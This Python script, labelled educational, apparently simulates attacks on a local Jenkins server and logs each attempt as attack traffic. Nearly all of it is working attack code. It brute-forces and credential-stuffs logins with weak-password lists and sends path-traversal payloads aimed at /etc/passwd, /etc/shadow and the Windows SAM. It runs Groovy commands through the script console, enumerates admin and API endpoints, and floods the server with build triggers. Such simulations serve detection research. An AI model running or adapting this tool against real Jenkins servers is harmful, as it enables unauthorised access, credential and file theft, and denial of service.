#!/usr/bin/env python3
"""
Attack Scenarios Script
Generates malicious traffic patterns for Jenkins
⚠️ FOR EDUCATIONAL PURPOSES ONLY - USE IN CONTROLLED ENVIRONMENT
"""

import requests
import time
import random
import sys
import os
from requests.auth import HTTPBasicAuth
import urllib3
from datetime import datetime

# Add scripts directory to path so we can import http_log_generator
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from http_log_generator import HTTPLogGenerator

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration
JENKINS_URL = "http://localhost:8080"
ATTACKER_IP = "192.168.1.100"  # Simulated attacker IP

# Common weak passwords for brute force
WEAK_PASSWORDS = [
    "password", "123456", "admin", "password123", "jenkins", 
    "admin123", "12345678", "qwerty", "letmein", "welcome",
    "monkey", "dragon", "master", "sunshine", "princess"
]

# Common usernames to try
COMMON_USERNAMES = [
    "admin", "jenkins", "user", "root", "administrator",
    "test", "guest", "demo", "support", "operator"
]

# Path traversal payloads
PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "../../../../../../var/log/jenkins.log",
    "../../../../../../../etc/shadow",
]

# Malicious Groovy scripts for script console
MALICIOUS_SCRIPTS = [
    'println "System.getProperty(\'user.name\')".execute().text',
    'println "whoami".execute().text',
    'new File("/etc/passwd").text',
    '"cat /etc/passwd".execute().text',
    'println System.getProperty("user.home")',
]

# API endpoints for enumeration
API_ENDPOINTS = [
    "/api/json",
    "/queue/api/json",
    "/computer/api/json",
    "/asynchPeople/api/json",
    "/systemInfo/api/json",
    "/manage",
    "/configure",
    "/script",
    "/credentials/",
    "/pluginManager/",
]

class AttackScenarios:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Attack Framework)',
            'X-Forwarded-For': ATTACKER_IP
        })
    
    def print_attack_header(self, attack_name, mitre_id, severity):
        """Print attack header"""
        colors = {
            'CRITICAL': '\033[91m',  # Red
            'HIGH': '\033[91m',      # Red
            'MEDIUM': '\033[93m',    # Yellow
            'LOW': '\033[92m',       # Green
            'END': '\033[0m'         # Reset
        }
        
        color = colors.get(severity, colors['END'])
        print(f"\n{'='*70}")
        print(f"{color}🎯 ATTACK: {attack_name}{colors['END']}")
        print(f"   MITRE ATT&CK: {mitre_id}")
        print(f"   Severity: {color}{severity}{colors['END']}")
        print(f"   Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{'='*70}\n")
    
    def brute_force_login(self, username="admin", password_list=None):
        """
        T1110.001 - Password Guessing
        Attempt to brute force login with common passwords
        """
        self.print_attack_header(
            "Brute Force Login Attack",
            "T1110.001",
            "HIGH"
        )
        
        if password_list is None:
            password_list = WEAK_PASSWORDS[:10]
        
        successful = False
        attempts = 0
        
        for password in password_list:
            attempts += 1
            try:
                response = self.session.get(
                    f"{JENKINS_URL}/login",
                    auth=HTTPBasicAuth(username, password),
                    timeout=5
                )
                
                # Log the attack attempt
                HTTPLogGenerator.log_attack_request(
                    http_method="GET",
                    request_path="/login",
                    response_code=response.status_code,
                    bytes_sent=len(response.content) if hasattr(response, 'content') else 0,
                    auth_user=username,
                    client_ip=ATTACKER_IP,
                    attack_type="brute_force"
                )
                
                status = "✓ SUCCESS" if response.status_code == 200 else "✗ FAILED"
                print(f"[{attempts:02d}] Trying {username}:{password} - {status} ({response.status_code})")
                
                if response.status_code == 200:
                    successful = True
                    break
                
                time.sleep(random.uniform(0.5, 1.5))
                
            except Exception as e:
                print(f"[{attempts:02d}] Error: {e}")
        
        print(f"\n{'='*70}")
        print(f"Attack Result: {'SUCCESS' if successful else 'FAILED'}")
        print(f"Total Attempts: {attempts}")
        print(f"{'='*70}\n")
        
        return successful
    
    def credential_stuffing(self, credentials_list=None):
        """
        T1110.004 - Credential Stuffing
        Try leaked username:password combinations
        """
        self.print_attack_header(
            "Credential Stuffing Attack",
            "T1110.004",
            "HIGH"
        )
        
        if credentials_list is None:
            credentials_list = [
                ("admin", "admin"),
                ("jenkins", "jenkins"),
                ("admin", "password"),
                ("root", "root"),
                ("user", "user123"),
            ]
        
        successful_logins = []
        
        for username, password in credentials_list:
            try:
                response = self.session.get(
                    f"{JENKINS_URL}/login",
                    auth=HTTPBasicAuth(username, password),
                    timeout=5
                )
                
                status = "✓ SUCCESS" if response.status_code == 200 else "✗ FAILED"
                print(f"Testing {username}:{password} - {status} ({response.status_code})")
                
                if response.status_code == 200:
                    successful_logins.append((username, password))
                
                time.sleep(random.uniform(0.3, 1.0))
                
            except Exception as e:
                print(f"Error testing {username}:{password} - {e}")
        
        print(f"\n{'='*70}")
        print(f"Successful Logins: {len(successful_logins)}")
        if successful_logins:
            print("Compromised Accounts:")
            for user, pwd in successful_logins:
                print(f"  - {user}:{pwd}")
        print(f"{'='*70}\n")
        
        return successful_logins
    
    def path_traversal_attack(self):
        """
        T1083 - File and Directory Discovery
        Attempt path traversal to access sensitive files
        """
        self.print_attack_header(
            "Path Traversal Attack",
            "T1083",
            "HIGH"
        )
        
        vulnerable = False
        
        for payload in PATH_TRAVERSAL_PAYLOADS:
            try:
                # Try multiple endpoints
                endpoints = [
                    f"/static/{payload}",
                    f"/userContent/{payload}",
                    f"/plugin/{payload}",
                ]
                
                for endpoint in endpoints:
                    response = self.session.get(
                        f"{JENKINS_URL}{endpoint}",
                        timeout=5
                    )
                    
                    # Log the attack attempt
                    HTTPLogGenerator.log_attack_request(
                        http_method="GET",
                        request_path=endpoint,
                        response_code=response.status_code,
                        bytes_sent=len(response.content) if hasattr(response, 'content') else 0,
                        client_ip=ATTACKER_IP,
                        attack_type="path_traversal"
                    )
                    
                    status_symbol = "🔴" if response.status_code == 200 else "⚪"
                    print(f"{status_symbol} {endpoint} - Status: {response.status_code}")
                    
                    if response.status_code == 200 and len(response.content) > 0:
                        vulnerable = True
                        print(f"   ⚠️ VULNERABLE! Payload successful!")
                    
                    time.sleep(random.uniform(0.2, 0.8))
                    
            except Exception as e:
                print(f"Error with payload {payload}: {e}")
        
        print(f"\n{'='*70}")
        print(f"Vulnerability Found: {'YES ⚠️' if vulnerable else 'NO'}")
        print(f"{'='*70}\n")
        
        return vulnerable
    
    def script_console_exploitation(self):
        """
        T1059.007 - Command and Scripting Interpreter: JavaScript
        Attempt to execute code via script console
        """
        self.print_attack_header(
            "Script Console Exploitation",
            "T1059.007",
            "CRITICAL"
        )
        
        executed = False
        
        # First, try to access script console
        try:
            response = self.session.get(
                f"{JENKINS_URL}/script",
                auth=HTTPBasicAuth("admin", "admin123"),
                timeout=5
            )
            
            # Log the script console access attempt
            HTTPLogGenerator.log_attack_request(
                http_method="GET",
                request_path="/script",
                response_code=response.status_code,
                bytes_sent=len(response.content) if hasattr(response, 'content') else 0,
                client_ip=ATTACKER_IP,
                attack_type="script_console"
            )
            
            print(f"Script Console Access: Status {response.status_code}")
            
            if response.status_code == 200:
                print("⚠️ Script console is accessible!")
                
                # Try to execute malicious scripts
                for script in MALICIOUS_SCRIPTS[:3]:
                    try:
                        exec_response = self.session.post(
                            f"{JENKINS_URL}/script",
                            auth=HTTPBasicAuth("admin", "admin123"),
                            data={'script': script},
                            timeout=5
                        )
                        
                        # Log the script execution attempt
                        HTTPLogGenerator.log_attack_request(
                            http_method="POST",
                            request_path="/script",
                            response_code=exec_response.status_code,
                            bytes_sent=len(exec_response.content) if hasattr(exec_response, 'content') else 0,
                            client_ip=ATTACKER_IP,
                            attack_type="script_execution"
                        )
                        
                        print(f"\nExecuted: {script[:50]}...")
                        print(f"Response: {exec_response.status_code}")
                        
                        if exec_response.status_code == 200:
                            executed = True
                        
                        time.sleep(random.uniform(1, 2))
                        
                    except Exception as e:
                        print(f"Execution error: {e}")
            
        except Exception as e:
            print(f"Access error: {e}")
        
        print(f"\n{'='*70}")
        print(f"Code Execution: {'SUCCESS ⚠️' if executed else 'FAILED'}")
        print(f"{'='*70}\n")
        
        return executed
    
    def api_enumeration(self):
        """
        T1087 - Account Discovery
        Enumerate API endpoints to discover information
        """
        self.print_attack_header(
            "API Enumeration Attack",
            "T1087",
            "MEDIUM"
        )
        
        discovered = []
        
        for endpoint in API_ENDPOINTS:
            try:
                response = self.session.get(
                    f"{JENKINS_URL}{endpoint}",
                    auth=HTTPBasicAuth("admin", "admin123"),
                    timeout=5
                )
                
                # Log the enumeration attempt
                HTTPLogGenerator.log_attack_request(
                    http_method="GET",
                    request_path=endpoint,
                    response_code=response.status_code,
                    bytes_sent=len(response.content) if hasattr(response, 'content') else 0,
                    auth_user="admin",
                    client_ip=ATTACKER_IP,
                    attack_type="api_enumeration"
                )
                
                status_symbol = "✓" if response.status_code == 200 else "✗"
                access = "ACCESSIBLE" if response.status_code == 200 else "RESTRICTED"
                
                print(f"{status_symbol} {endpoint:<30} - {access} ({response.status_code})")
                
                if response.status_code == 200:
                    discovered.append(endpoint)
                
                time.sleep(random.uniform(0.3, 0.8))
                
            except Exception as e:
                print(f"✗ {endpoint:<30} - ERROR: {e}")
        
        print(f"\n{'='*70}")
        print(f"Discovered Endpoints: {len(discovered)}/{len(API_ENDPOINTS)}")
        if discovered:
            print("Accessible:")
            for ep in discovered:
                print(f"  - {ep}")
        print(f"{'='*70}\n")
        
        return discovered
    
    def dos_build_triggering(self, job_name="sample-build-job", count=20):
        """
        T1499 - Endpoint Denial of Service
        Overwhelm system by triggering excessive builds
        """
        self.print_attack_header(
            "DoS via Build Triggering",
            "T1499",
            "HIGH"
        )
        
        successful_triggers = 0
        
        print(f"Triggering {count} builds for job: {job_name}\n")
        
        for i in range(count):
            try:
                response = self.session.post(
                    f"{JENKINS_URL}/job/{job_name}/build",
                    auth=HTTPBasicAuth("admin", "admin123"),
                    timeout=5
                )
                
                # Log the DoS attack attempt
                HTTPLogGenerator.log_attack_request(
                    http_method="POST",
                    request_path=f"/job/{job_name}/build",
                    response_code=response.status_code,
                    bytes_sent=len(response.content) if hasattr(response, 'content') else 0,
                    auth_user="admin",
                    client_ip=ATTACKER_IP,
                    attack_type="dos_build"
                )
                
                status = "✓" if response.status_code in [200, 201] else "✗"
                print(f"[{i+1:02d}/{count}] Build trigger - {status} ({response.status_code})")
                
                if response.status_code in [200, 201]:
                    successful_triggers += 1
                
                # Rapid fire - minimal delay
                time.sleep(random.uniform(0.1, 0.3))
                
            except Exception as e:
                print(f"[{i+1:02d}/{count}] Error: {e}")
        
        print(f"\n{'='*70}")
        print(f"Successful Triggers: {successful_triggers}/{count}")
        print(f"Attack Impact: {'HIGH ⚠️' if successful_triggers > count/2 else 'LOW'}")
        print(f"{'='*70}\n")
        
        return successful_triggers
    
    def unauthorized_admin_access(self):
        """
        T1078 - Valid Accounts
        Attempt to access admin pages without proper authorization
        """
        self.print_attack_header(
            "Unauthorized Admin Access",
            "T1078",
            "HIGH"
        )
        
        admin_endpoints = [
            "/configure",
            "/manage",
            "/script",
            "/systemInfo",
            "/pluginManager",
            "/configureSecurity",
            "/credentials/",
        ]
        
        accessible = []
        
        # Try without authentication
        print("Testing without authentication:\n")
        for endpoint in admin_endpoints:
            try:
                response = self.session.get(
                    f"{JENKINS_URL}{endpoint}",
                    timeout=5
                )
                
                # Log the unauthorized access attempt
                HTTPLogGenerator.log_attack_request(
                    http_method="GET",
                    request_path=endpoint,
                    response_code=response.status_code,
                    bytes_sent=len(response.content) if hasattr(response, 'content') else 0,
                    auth_user="-",
                    client_ip=ATTACKER_IP,
                    attack_type="unauthorized_access"
                )
                
                status_symbol = "🔴" if response.status_code == 200 else "✓"
                result = "VULNERABLE!" if response.status_code == 200 else "Protected"
                
                print(f"{status_symbol} {endpoint:<25} - {result} ({response.status_code})")
                
                if response.status_code == 200:
                    accessible.append(endpoint)
                
                time.sleep(random.uniform(0.3, 0.8))
                
            except Exception as e:
                print(f"✗ {endpoint:<25} - ERROR: {e}")
        
        print(f"\n{'='*70}")
        print(f"Accessible Admin Pages: {len(accessible)}")
        if accessible:
            print("⚠️ SECURITY ISSUE - Admin pages accessible:")
            for ep in accessible:
                print(f"  - {ep}")
        else:
            print("✓ All admin pages are properly protected")
        print(f"{'='*70}\n")
        
        return accessible

def run_all_attacks():
    """Run all attack scenarios"""
    print("""
╔══════════════════════════════════════════════════════════════╗
║     Jenkins Security Attack Scenarios                        ║
║     ⚠️  FOR EDUCATIONAL PURPOSES ONLY  ⚠️                     ║
║     USE ONLY IN CONTROLLED ENVIRONMENTS                      ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    attacker = AttackScenarios()
    
    results = {
        'brute_force': False,
        'credential_stuffing': False,
        'path_traversal': False,
        'script_console': False,
        'api_enumeration': False,
        'dos_attack': False,
        'unauthorized_access': False
    }
    
    # 1. Brute Force Attack
    input("\nPress Enter to start Brute Force Attack...")
    results['brute_force'] = attacker.brute_force_login()
    time.sleep(3)
    
    # 2. Credential Stuffing
    input("\nPress Enter to start Credential Stuffing Attack...")
    creds = attacker.credential_stuffing()
    results['credential_stuffing'] = len(creds) > 0
    time.sleep(3)
    
    # 3. Path Traversal
    input("\nPress Enter to start Path Traversal Attack...")
    results['path_traversal'] = attacker.path_traversal_attack()
    time.sleep(3)
    
    # 4. Script Console Exploitation
    input("\nPress Enter to start Script Console Exploitation...")
    results['script_console'] = attacker.script_console_exploitation()
    time.sleep(3)
    
    # 5. API Enumeration
    input("\nPress Enter to start API Enumeration...")
    endpoints = attacker.api_enumeration()
    results['api_enumeration'] = len(endpoints) > 0
    time.sleep(3)
    
    # 6. DoS Build Triggering
    input("\nPress Enter to start DoS Attack...")
    triggers = attacker.dos_build_triggering(count=15)
    results['dos_attack'] = triggers > 5
    time.sleep(3)
    
    # 7. Unauthorized Admin Access
    input("\nPress Enter to start Unauthorized Access Test...")
    admin_pages = attacker.unauthorized_admin_access()
    results['unauthorized_access'] = len(admin_pages) > 0
    
    # Summary
    print("\n" + "="*70)
    print("ATTACK SUMMARY")
    print("="*70)
    for attack, success in results.items():
        status = "✓ SUCCESS" if success else "✗ FAILED"
        print(f"{attack.replace('_', ' ').title():<30} - {status}")
    print("="*70)

def main():
    # Wait for Jenkins
    print("\nWaiting for Jenkins to be ready...")
    max_retries = 30
    for i in range(max_retries):
        try:
            response = requests.get(JENKINS_URL, timeout=5)
            if response.status_code in [200, 403]:
                print("✓ Jenkins is ready!")
                break
        except:
            pass
        
        if i < max_retries - 1:
            print(f"Waiting... ({i+1}/{max_retries})")
            time.sleep(5)
        else:
            print("✗ Jenkins is not responding.")
            return
    
    # Menu
    print("\nSelect attack scenario:")
    print("1) Brute Force Login")
    print("2) Credential Stuffing")
    print("3) Path Traversal")
    print("4) Script Console Exploitation")
    print("5) API Enumeration")
    print("6) DoS Build Triggering")
    print("7) Unauthorized Admin Access")
    print("8) Run ALL attacks (sequential)")
    
    try:
        choice = input("\nEnter choice [1-8]: ").strip()
        
        attacker = AttackScenarios()
        
        if choice == "1":
            attacker.brute_force_login()
        elif choice == "2":
            attacker.credential_stuffing()
        elif choice == "3":
            attacker.path_traversal_attack()
        elif choice == "4":
            attacker.script_console_exploitation()
        elif choice == "5":
            attacker.api_enumeration()
        elif choice == "6":
            attacker.dos_build_triggering()
        elif choice == "7":
            attacker.unauthorized_admin_access()
        elif choice == "8":
            run_all_attacks()
        else:
            print("Invalid choice")
    
    except KeyboardInterrupt:
        print("\n\nStopped by user")
    except Exception as e:
        print(f"\nError: {e}")

if __name__ == "__main__":
    main()
